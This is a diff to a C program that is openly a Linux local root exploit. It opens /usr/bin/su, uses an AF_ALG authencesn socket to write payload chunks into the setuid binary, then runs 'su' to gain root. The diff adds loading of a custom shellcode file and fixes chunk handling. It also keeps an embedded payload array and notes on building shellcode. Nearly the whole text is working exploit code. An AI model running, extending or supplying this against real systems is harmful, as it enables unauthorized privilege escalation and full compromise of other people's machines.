@@ -32,9 +32,7 @@ void send_chunk(int sock_fd, int su_fd, int offset, unsigned char* chunk) {
         .msg_iovlen = 1
     };
 
-    struct cmsghdr *cmsg;
-
-    cmsg = CMSG_FIRSTHDR(&msg);
+    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
     cmsg->cmsg_level = SOL_ALG;
     cmsg->cmsg_type = ALG_SET_OP;
     cmsg->cmsg_len = CMSG_LEN(4);
@@ -97,17 +95,49 @@ void send_chunk(int sock_fd, int su_fd, int offset, unsigned char* chunk) {
     close(pipefds[1]);
 }
 
-int main(){
+int main(int argc, char** argv){
     // To generate, run:
     // gcc -c payloads/shellcode_x64.S
     // objcpy -O binary shellcode_x64.o payload_x86.raw
     // xxd -i payload_x86.raw > payload.txt
-    unsigned char payload[] = {
+    unsigned char default_payload[] = {
         0x04, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
         0x47, 0x4e, 0x55, 0x00, 0x02, 0x00, 0x01, 0xc0, 0x04, 0x00, 0x00, 0x00,
         0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xc0,
         0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
     };
+
+    unsigned char* payload = default_payload;
+    size_t payload_len = sizeof(default_payload);
+    int is_alloc = 0;
+
+    // For user defined [path/to/payload]
+    if (argc > 1) {
+        FILE* payload_fptr = fopen(argv[1], "rb"); 
+	    if (payload_fptr == NULL) {
+    		perror("IO ERROR: File does not exist.\n");
+	    	exit(1);
+	    } else {
+	    	fseek(payload_fptr, 0, SEEK_END);
+		    long fsize = ftell(payload_fptr);
+		    fseek(payload_fptr, 0, SEEK_SET);
+
+		    if (fsize > 0) {
+                unsigned char* buff = malloc(fsize);
+                if (buff) {
+                    if (fread(buff, 1, fsize, payload_fptr) == (size_t)fsize) {
+                        payload = buff;
+                        payload_len = (size_t)fsize;
+                        is_alloc = true;
+                    } else {
+                        free(buff);
+                    }
+                }
+                fclose(payload_fptr);
+            }
+
+        }
+    } 
 
     // Read setuid binary file descriptor 
 	FILE* fptr = fopen("/usr/bin/su", "r");
@@ -119,7 +149,6 @@ int main(){
     printf("Opened \'/usr/bin/su\' with fd=%d\n", su_fd);
 
     // setup algif_aead socket and bind to authencesn
-    int sock;
 
     struct sockaddr_alg sa = {
         .salg_family = AF_ALG,
@@ -127,7 +156,7 @@ int main(){
         .salg_name = "authencesn(hmac(sha256),cbc(aes))"
     };
 
-    sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
+    int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
     if (sock == -1) {
         perror("socket");
         return 1;
@@ -157,8 +186,7 @@ int main(){
     puts("Set socket level option: AEAD length = 4 bytes");
       
     // Grab connection
-    int sock_fd;
-    sock_fd = accept(sock, NULL, 0);
+    int sock_fd = accept(sock, NULL, 0);
     if (sock_fd == -1) {
         perror("connect");
         close(sock);
@@ -166,19 +194,27 @@ int main(){
     } 
     puts("Connection Established");
 
-    for (int offset = 0; offset < (int)sizeof(payload); offset += 4) {
+    for (int offset = 0; offset < (int)payload_len; offset += 4) {
         int type;
         socklen_t type_len = sizeof(type);
         getsockopt(sock_fd, SOL_SOCKET, SO_TYPE, &type, &type_len);
         printf("Sending 4B payload chunk to: socket.socket, fd=%d, family=%d, type=%d, proto=0\n", sock_fd, sa.salg_family, type);
         unsigned char chunk[4];
-        memcpy(chunk, payload+offset, 4);
+
+        size_t remaining = payload_len - offset;
+        size_t bytes_to_copy = (remaining < 4) ? remaining : 4;
+        memset(chunk, 0, 4);
+        memcpy(chunk, payload + offset, bytes_to_copy);
         send_chunk(sock_fd, su_fd, offset, chunk); 
     }
 
     // run setuid binary after corrupting it
     puts("Corruption complete! Becoming root now...");
     system("su");
+
+    if (is_alloc) {
+        free(payload);
+    }
 
     close(sock);
     return 0;
